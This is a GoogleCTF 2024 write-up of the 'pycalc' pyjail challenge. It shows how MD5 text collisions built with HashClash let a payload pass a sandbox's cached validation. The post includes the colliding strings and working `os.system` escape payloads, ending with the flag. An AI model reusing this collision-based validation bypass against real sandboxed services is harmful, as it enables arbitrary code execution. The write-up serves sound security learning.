---
layout: post
title: pycalc | GoogleCTF 2024
description: Pyjail + MD5 = 😃
author: Ronak Badhe
tags: misc crypto pyjail
---

# PyCalc

Writeup by [r2uwu2](https://github.com/r2dev2) from [PBR \| UCLA](https://pbr.acmcyber.com).

This is also published on [hackmd](https://hackmd.io/@r2dev2/r1lrXzLUC).

> A safe Python calculator in a non-bypassable sandbox.

> Solves: 33
> Points: 246

## Challenge

We are given no source and the `nc` connection `pycalc.2024.ctfcompetition.com 1337`.

Connecting to it, we get a python repl:

```
$: nc pycalc.2024.ctfcompetition.com 1337
== proof-of-work: disabled ==
Simple calculator in Python, type 'exit' to exit
> 1+1
1+1
Caching code validation result with key d96e018f51ea61e5ff2f9c349c5da67d
Waiting up to 10s for completion
2
```

Messing around, it seems like we are banned at the opcode level from calling functions, accessing properties, building lists, and more.

When the environment validates our Python, it caches the check with a hash. To test out which hashing function is in use, I typed in `a` and checked the hash against <https://crackstation.net/>.

```
> a
a
Caching code validation result with key 0cc175b9c0f1b6a831c399e269772661
Waiting up to 10s for completion
name 'a' is not defined
```

![crackstation lookup](https://hackmd.io/_uploads/HkAd8GUU0.png)

Crackstation shows us that the repl is using `md5` to hash our command when caching the result. Unfortunately for PyCalc, `md5` is notorious for being vulnerable to collision attacks such as chosen prefix, identical prefix, and more.

## How to Collide?

> @AVDestroyer @joshua do yall know if its possible do do a md5 chosen prefix and have the suffix be all printable chars

This challenge isn't my first rodeo in the realm of md5 hash collisions. Back in 2023 SDCTF, I did a challenge which revolved around finding two bytestrings that hash to the same thing with one bytestring starting with `R` and another starting with `P`. To perform this chosen prefix attack, I used [HashClash](https://github.com/cr-marcstevens/hashclash) (a software that performed chosen-prefix and identical-prefix attacks).

> Side Note: HashClash was casually released by Marc Stevens as part of his masters thesis in 2009 and is still the SOTA software for md5 collision attacks. Marc occasionally releases a mind-blowing new to the repository every few years (including SHA-1 attacks).

Unfortunately, the chosen prefix attack will append arbitrary bytes to the prefix. As our collision has to be valid Python syntax, Marc's chosen prefix attack will not work.

### New Collision Just Dropped

After visiting [HashClash](https://github.com/cr-marcstevens/hashclash), I saw an interesting collision in the `README` "Create your own text identical-prefix collision":

```python
md5("TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak")
=
md5("TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak")
```

This is a collision betwen two ascii strings that differ only in the 22nd byte (top has `A`, bottom has `E`, `hAcK` vs `hEcK`). Also, looking at the commit history, this collision and generating script were added to the repository [3 months ago](https://github.com/cr-marcstevens/hashclash/pull/28) out of the blue.

![textcoll pr](https://hackmd.io/_uploads/rkUr3zU8R.png)

No context, no documentation, no papers, just "Add text collision attack" and `scripts/textcoll.sh`.

Absolute GOAT.

### Understanding TextColl

![avdestroyer banter](https://hackmd.io/_uploads/SkJlZQIIA.png)


Looking at `textcoll.sh` we see below configuration steps:

```sh
prefixfile=$1

if [ -z $prefixfile ]; then
	prefixfile=dummy.prefix.bin
fi
if [ ! -f $prefixfile ]; then
	touch $prefixfile
fi

#ALPHABET="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.,_-~=+:;|?@#^&*(){}[]<>"
ALPHABET="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.,_-~=+:;|?@#^&*"
#ALPHABET="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

# First block: byte21 has a +4 difference: you must ensure that this difference is possible in the alphabet, e.g., have both A and E(=A+4)
FIRSTBLOCKBYTES='--byte0 T --byte1 E --byte2 X --byte3 T --byte4 C --byte5 O --byte6 L --byte7 L --byte20 hH --byte21 aAeE --byte22 cC --byte23 kK'

# Second block: 
# - keep the alphabet of bytes 0-7 large: otherwise there could be no solutions
# - keep the alphabet of bytes 56-63 large: to make the search fast
# - if you want to set many bytes of the 2nd block then you should customize the 2nd block search in src/md5textcoll/block2.cpp
SECONDBLOCKBYTES='--byte8 B --byte9 y --byte10 M --byte11 a --byte12 r --byte13 c --byte14 S --byte15 t --byte16 e --byte17 v --byte18 e --byte19 n --byte20 s'
```

It seems like we can specify a few constraints to generate collisions. We can specify the alphabet used as well as possible values certain bytes can take. Upon much experimentation, I understand the comment regarding `byte21` to mean the collision produces a pair of bytestrings only differing at the byte at 0-index 21 (where one is 4 greater than the other). I tried to find a paper explaining this attack, but I suppose it is too new to have a paper.

> Side Note: During the CTF, many CTFers were spamming the issues section of HashClash with [many](https://github.com/cr-marcstevens/hashclash/issues/43) textcoll [questions](https://github.com/cr-marcstevens/hashclash/issues/44). Marc Stevens was very active in answering them. I wonder if he knew about the CTF.

We can also specify an optional `prefixfile` that I presumed to be a multiple of `64` bytes that can prefix the collision (extrapolating from identical-prefix-collision docs).

## Naïve Payloads

![image](https://hackmd.io/_uploads/SJMMMmUI0.png)
> Forgot to turn on performance mode count: ∞

After wrangling the `textcoll.sh` script for many hours, I found out following:

* Both strings are the same except for the 22nd byte (differ by 4 in ascii).
* One cannot contrain a byte to be a space due to the way arguments are parsed.
* The `--byte` options must be passed inside the single quote. I know how shells work :lemonthink:
* Constraining the alphabet too much results in failure to converge.
* Time taken to generate collisions varies unpredictably (from 10 minutes to > 1 hour).

### Vanilla TextColl

My initial idea was to generate a collision (`a`, `b`) in which `a` does `v<()` and `b` does `vB()`. As comparison between variable and tuple is valid syntax, `a` would pass validation and allow us to execute `b`. Before running `b`, I could set `vB` to `breakpoint` so that ultimately, `breakpoint()` is run which allows me to type arbitrary command to explore the host.

I generated below collision:

```python
"aWhXJ<f}is%/M#qvS";p>()#tt(<)Oni)co?|_Pa)-{atRkzm]=z)!Xrwb0R/0vhx+~?(70SYB+IemMAhHpW9j$m*f q)Q}:TW,zg{*SfSsumAR,@SX  $ )   u?!s
```

collides with
```python
"aWhXJ<f}is%/M#qvS";pB()#tt(<)Oni)co?|_Pa)-{atRkzm]=z)!Xrwb0R/0vhx+~?(70SYB+IemMAhHpW9j$m*f q)Q}:TW,zg{*SfSsumAR,@SX  $ )   u?!s
```

However, I was met with the error `pB is not defined` when I inputted the second payload. Playing around, it seems like each Python command is run in its isolated subprocess.

```
> a = 1
a = 1
Caching code validation result with key fd352b68bf83391284e044021cab0339
Waiting up to 10s for completion
> a
a
Caching code validation result with key 0cc175b9c0f1b6a831c399e269772661
Waiting up to 10s for completion
name 'a' is not defined
```

My payload needs to be self-contained

### Prefixed TextColl

I then explored the `$prefixfile` option of `textcoll.sh`.

Using a prefix of `aB=a1=a3=a9=AB=A1=A3=A9=bB=b1=b3=b9=BB=B1=B3=B9=breakpoint;"aaaa`, I generated below collisions:

```python
aB=a1=a3=a9=AB=A1=A3=A9=bB=b1=b3=b9=BB=B1=B3=B9=breakpoint;"aaaaP%c0@<TZ2={7]nqELi"*b-()#XaFjeQpBKCR|z@(hswE(SE2Di$d7A (sa.sT < W#3J]?4RZv%ruL)k&7CZF8CmCahsO[=H)c@VU6S|jzm;9>5jiRqGV\& %T  nRaZ
```
and
```python
aB=a1=a3=a9=AB=A1=A3=A9=bB=b1=b3=b9=BB=B1=B3=B9=breakpoint;"aaaaP%c0@<TZ2={7]nqELi"*b1()#XaFjeQpBKCR|z@(hswE(SE2Di$d7A (sa.sT < W#3J]?4RZv%ruL)k&7CZF8CmCahsO[=H)c@VU6S|jzm;9>5jiRqGV\& %T  nRaZ
```

to be met with `COPY is not allowed` 🫤.

![COPY not allowed](https://hackmd.io/_uploads/BJUEDXILC.png)

I generated another set of collisions (without using chained assignments) to be met with `ncat: broken pipe`.

![image](https://hackmd.io/_uploads/B1vCPmUIC.png)

In the moment, I thought this meant that this indicated a closing of `stdin` for executed commands so I devised an `eval`-based payload.

After messing around more with various prefixed payloads, I found that the statements are truncated to 192 bytes so I generated

```python
aB=eval;a1=aB;a3=aB;a9=aB;s='print(open("flag").read())';"aaaaaaO@d]H|;y$[XW2aV~11"-a-(s)#fdFTK_DRSYs1O-T;42af.H2IH8v3#gsdxB:, tHLs|AS.(*,v{(}yVe}$^(MtIi#~3a~,{l4@wF+!O~!]i&~/_/FIi  & &   Q2LB
```
and
```python
aB=eval;a1=aB;a3=aB;a9=aB;s='print(open("flag").read())';"aaaaaaO@d]H|;y$[XW2aV~11"-a1(s)#fdFTK_DRSYs1O-T;42af.H2IH8v3#gsdxB:, tHLs|AS.(*,v{(}yVe}$^(MtIi#~3a~,{l4@wF+!O~!]i&~/_/FIi  & &   Q2LB
```

and I got the same `ncat: broken pipe`.

Looking at the messages longer, I see that I am not getting any message saying `Hit code validation result cache` which is what the repl responds with when it hits a code validation cache. This means that it wasn't even looking at my second statement.

Using a string generated with `'"' + 'a' * 190 + '"'`, I found that the repl (in addition to limiting to 192 chars) only executes a 192 byte command once.

> Side Note: After the CTF, I looked at the not-provided source and found that it was doing `sys.stdin.read(192)` and then if it encounters an empty line, it exits. Since my payload is 192 bytes and I use a newline to input the payload, the repl runs the first command and sees an empty command which causes it to exit. Entering my two payloads on the same line bypasses this. However, THIS CHALL WAS SOURCELESS SO I WOULDN'T HAVE KNOWN.

I needed to do something _not_ naïve.

## MD5 Suffix Shenanigans

![image](https://hackmd.io/_uploads/BJimPiIUC.png)

> PBRgrid going ham at 3:30 am

After searching for resources on collision attacks, I stumbled upon a comment in [corkami/collisions](https://github.com/corkami/collisions?tab=readme-ov-file#attacks):

> MD5 and SHA1 work with blocks of 64 bytes.
>
> If two contents A & B have the same hash, then appending the same contents C to both will keep the same hash.
>
> ```
> hash(A) = hash(B) -> hash(A + C) = hash(B + C)
> ```

This is very interesting and could have some implications if it is real. Following the letter of the statement, I tested it with the below 72-byte collision from the HashClash `README`.

```python
md5("TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak")
=
md5("TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak")
```

```shell!
$: (printf 'TEXTCOLL...'; printf 'a') | md5sum
a625be21ed217baad542766a38adaa75  -
$: (printf 'TEXTCOLL...'; printf 'a') | md5sum
8d300d113cbb94326aa572cd6076824d  -
```

Umm, I'm no cryptographer, but that statement does not seem to hold.

I tried it again, but with a 128 byte collision I found earlier (perhaps this only works for collisions that are a multiple of 64 bytes long):

```python
from hashlib import md5

# m1 = b"TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak"
# m2 = b"TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak"
m1 = """
"aWhXJ<f}is%/M#qvS";p>()#tt(<)Oni)co?|_Pa)-{atRkzm]=z)!Xrwb0R/0vhx+~?(70SYB+IemMAhHpW9j$m*f q)Q}:TW,zg{*SfSsumAR,@SX  $ )   u?!s
""".strip().encode()
m2 = """
"aWhXJ<f}is%/M#qvS";pB()#tt(<)Oni)co?|_Pa)-{atRkzm]=z)!Xrwb0R/0vhx+~?(70SYB+IemMAhHpW9j$m*f q)Q}:TW,zg{*SfSsumAR,@SX  $ )   u?!s
""".strip().encode()


h1 = md5(m1).hexdigest()
h2 = md5(m2).hexdigest()
print(f"{h1=}, {h2=}")

suffix = b"abcd"
h1 = md5(m1 + suffix).hexdigest()
h2 = md5(m2 + suffix).hexdigest()
print(f"{h1=}, {h2=}")
```
```
h1='2ab22d067660e4395b0cfe5bd5739212', h2='2ab22d067660e4395b0cfe5bd5739212'
h1='c0537b259c408325fe730a58007eddad', h2='c0537b259c408325fe730a58007eddad'
```

Wow, that statement regarding suffixes seems to hold for 128 byte collisions. Maybe a cryptographer can clarify what the statement should be as I am a bit confused. However, 128 byte collisions is all I can currently generate so I proceeded with this knowledge.

At 3 am, I finally figured out what do do with this knowledge.

![genius idea](https://hackmd.io/_uploads/H1Uy2iILR.png)

If I generate a collision (`a`, `b`) where `a` is `"<random>"#<random>` and `b` is `"<random>"'<random>`, I can append the common suffix `'; <arbitrary python code>`. For `a`, the suffix is commented out which passes the validation. For `b`, the random data is closed out with the string and my python code will execute.

Using PBRgrid, I generated the following collision:

```
"Q(3@U2WxwNlRepk.9-0"#o}N\WN(N_A;9f/ i!-{:&7?;^B_$|-qp$xv@*Jw&@*khF|N`nIBt`Qh+_zkK0r(46cROJjd(J3D:zgxm@iD(U\ eCA(G>c     ,  wMYW
```
and
```
"Q(3@U2WxwNlRepk.9-0"'o}N\WN(N_A;9f/ i!-{:&7?;^B_$|-qp$xv@*Jw&@*khF|N`nIBt`Qh+_zkK0r(46cROJjd(J3D:zgxm@iD(U\ eCA(G>c     ,  wMYW
```

## Flag

Using the suffix `'; __import__("os").system("ls /")`, I found a `/readflag` executable.

```
$: nc pycalc.2024.ctfcompetition.com 1337
== proof-of-work: disabled ==
Simple calculator in Python, type 'exit' to exit
> "Q(3@U2WxwNlRepk.9-0"#o}N\WN(N_A;9f/ i!-{:&7?;^B_$|-qp$xv@*Jw&@*khF|N`nIBt`Qh+_zkK0r(46cROJjd(J3D:zgxm@iD(U\ eCA(G>c     ,  wMYW'; __import__("os").system("ls /")
"Q(3@U2WxwNlRepk.9-0"#o}N\WN(N_A;9f/ i!-{:&7?;^B_$|-qp$xv@*Jw&@*khF|N`nIBt`Qh+_zkK0r(46cROJjd(J3D:zgxm@iD(U\ eCA(G>c     ,  wMYW'; __import__("os").system("ls /")
Caching code validation result with key 8cfee06ea80b6272183e67ecf73f5825
Waiting up to 10s for completion
'Q(3@U2WxwNlRepk.9-0'
> "Q(3@U2WxwNlRepk.9-0"'o}N\WN(N_A;9f/ i!-{:&7?;^B_$|-qp$xv@*Jw&@*khF|N`nIBt`Qh+_zkK0r(46cROJjd(J3D:zgxm@iD(U\ eCA(G>c     ,  wMYW'; __import__("os").system("ls /")
"Q(3@U2WxwNlRepk.9-0"'o}N\WN(N_A;9f/ i!-{:&7?;^B_$|-qp$xv@*Jw&@*khF|N`nIBt`Qh+_zkK0r(46cROJjd(J3D:zgxm@iD(U\ eCA(G>c     ,  wMYW'; __import__("os").system("ls /")
Hit code validation result cache with key 8cfee06ea80b6272183e67ecf73f5825
Waiting up to 10s for completion
'Q(3@U2WxwNlRepk.9-0o}N\\WN(N_A;9f/ i!-{:&7?;^B_$|-qp$xv@*Jw&@*khF|N`nIBt`Qh+_zkK0r(46cROJjd(J3D:zgxm@iD(U\\ eCA(G>c     ,  wMYW'
bin   dev  home  lib64  mnt  proc      root  sbin  sys  usr
boot  etc  lib   media  opt  readflag  run   srv   tmp  var
0
```

Executing it with suffix `'; __import__("os").system("/readflag")` gives the flag:

```
> "Q(3@U2WxwNlRepk.9-0"#o}N\WN(N_A;9f/ i!-{:&7?;^B_$|-qp$xv@*Jw&@*khF|N`nIBt`Qh+_zkK0r(46cROJjd(J3D:zgxm@iD(U\ eCA(G>c     ,  wMYW'; __import__("os").system("/readflag")
"Q(3@U2WxwNlRepk.9-0"#o}N\WN(N_A;9f/ i!-{:&7?;^B_$|-qp$xv@*Jw&@*khF|N`nIBt`Qh+_zkK0r(46cROJjd(J3D:zgxm@iD(U\ eCA(G>c     ,  wMYW'; __import__("os").system("/readflag")
Caching code validation result with key e22817c363df4090f20d84f400ef21fe
Waiting up to 10s for completion
'Q(3@U2WxwNlRepk.9-0'
> "Q(3@U2WxwNlRepk.9-0"'o}N\WN(N_A;9f/ i!-{:&7?;^B_$|-qp$xv@*Jw&@*khF|N`nIBt`Qh+_zkK0r(46cROJjd(J3D:zgxm@iD(U\ eCA(G>c     ,  wMYW'; __import__("os").system("/readflag")
"Q(3@U2WxwNlRepk.9-0"'o}N\WN(N_A;9f/ i!-{:&7?;^B_$|-qp$xv@*Jw&@*khF|N`nIBt`Qh+_zkK0r(46cROJjd(J3D:zgxm@iD(U\ eCA(G>c     ,  wMYW'; __import__("os").system("/readflag")
Hit code validation result cache with key e22817c363df4090f20d84f400ef21fe
Waiting up to 10s for completion
'Q(3@U2WxwNlRepk.9-0o}N\\WN(N_A;9f/ i!-{:&7?;^B_$|-qp$xv@*Jw&@*khF|N`nIBt`Qh+_zkK0r(46cROJjd(J3D:zgxm@iD(U\\ eCA(G>c     ,  wMYW'
CTF{Ca$4_f0r_d3_C4cH3_Ha5hC1a5h}
```

...which I failed to copy over correctly from my second computer at 3:40 am (I got many failed flag submissions lol).

![image](https://hackmd.io/_uploads/B1fPkhLIR.png)

This was a very fun challenge that took me from 9:15 am to 3:40 am (nearly 18.5 hours!) to solve. I look forward to the next GoogleCTF!
